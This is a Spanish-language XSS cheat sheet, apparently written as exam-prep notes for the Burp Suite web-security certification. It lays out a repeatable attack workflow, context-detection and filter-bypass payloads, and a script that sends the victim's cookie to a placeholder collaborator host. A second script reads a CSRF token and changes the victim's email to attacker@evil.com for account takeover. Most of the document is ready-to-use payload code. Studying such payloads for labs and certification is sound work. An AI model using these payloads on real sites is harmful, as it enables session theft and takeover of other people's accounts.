---
tipo: cheatsheet
vuln: xss
tags: [bscp, tipo/cheatsheet, vuln/xss]
relacionada: "[[Cross-Site-Scripting]]"
---

# CS · Cross-Site Scripting

## Flujo repetible
1. Inyecta un marcador único en {{PARAM}} y localiza dónde se refleja.
2. Identifica el contexto (HTML, atributo, string JS, URL).
3. Rompe el contexto con el payload mínimo que ejecute.
4. Escala: entrega vía {{EXPLOIT}} para que {{VICTIM}} ejecute → exfiltra a {{COLLAB}}.

## Detección
```html
<!-- Detección por contexto -->
<svg onload=alert(1)>            <!-- HTML -->
"><svg onload=alert(1)>          <!-- atributo -->
'-alert(1)-'                     <!-- string JS -->
javascript:alert(1)              <!-- href/URL -->
```

## Plantillas de payload
```html
<!-- Bypass de filtros -->
<img src=x onerror=alert(1)>
<iframe src=javascript:alert(1)>
<img/src/onerror=alert(1)>       <!-- sin espacios -->
<script>onerror=alert;throw 1</script>  <!-- sin paréntesis -->
```
```html
<!-- Exfiltrar cookie de {{VICTIM}} -->
<script>fetch('https://{{COLLAB}}/?c='+encodeURIComponent(document.cookie))</script>
```
```html
<!-- Account takeover: leer CSRF y realizar acción -->
<script>
var r=new XMLHttpRequest();
r.onload=function(){
  var t=/name="csrf" value="([^"]+)"/.exec(this.responseText)[1];
  var c=new XMLHttpRequest();
  c.open('POST','{{BASE}}/my-account/change-email',true);
  c.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  c.send('email=attacker@evil.com&csrf='+t);
};
r.open('GET','{{BASE}}/my-account',true); r.send();
</script>
```

## Escalada al objetivo
XSS ejecutado por {{VICTIM}} (admin) → robo de sesión o acción autenticada → acceso admin.

## Checklist
- [ ] Localicé el contexto de reflexión
- [ ] Ejecuté con el payload mínimo
- [ ] Revisé CSP y codificación
- [ ] Entregué vía {{EXPLOIT}} y confirmé callback en {{COLLAB}}

## Referencias
- https://portswigger.net/web-security/cross-site-scripting
